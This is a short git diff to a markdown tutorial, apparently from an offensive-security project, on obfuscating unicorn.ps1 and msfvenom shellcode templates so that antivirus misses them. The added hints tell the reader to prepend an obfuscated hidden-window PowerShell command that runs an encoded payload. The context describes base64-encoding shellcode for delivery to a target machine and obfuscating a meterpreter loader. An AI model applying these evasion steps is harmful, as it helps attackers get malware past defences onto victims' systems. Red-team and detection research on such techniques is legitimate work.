@@ -831,6 +831,9 @@ Encodind the template again into base64 to be embebbed into unicorn.ps1 (or not)
 Replace [ ENCODED-SHELLCODE-STRING ] by your new base64 string..<br />
 `HINT: now your new obfuscated template its ready to be deliver to target machine`<br />
 ![obfuscating the template](http://i.cubeupload.com/w7CJtx.png)
+`HINT: If your plans are using the msfvenom template, then remmenber to add the follow syscall (obfuscate it)`<br />
+`HINT: in the beggining of the template: %comspec% /b /c start /min powershell.exe -noP -wIn hIdDEn -en`<br />
+
 
 - Final Notes:<br />
 there is a tool [AVSignSeek](https://github.com/hegusung/AVSignSeek) that can help us in discovering what flags are beeing detected in our shellcode ..<br />Adicionally we can also obfuscated the meterpreter loader using arno0x0x random bytes stager [here](https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/)<br />
